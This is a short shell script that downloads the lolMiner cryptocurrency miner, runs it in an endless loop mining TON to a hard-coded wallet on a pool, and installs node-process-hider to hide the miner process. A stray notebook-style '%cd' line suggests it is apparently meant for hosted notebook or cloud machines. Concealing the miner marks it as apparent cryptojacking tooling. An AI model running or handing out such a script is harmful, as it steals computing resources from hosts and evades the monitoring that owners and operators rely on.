#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 89 95
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
while [ 1 ]; do
./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --apiport 4444
sleep 5

done
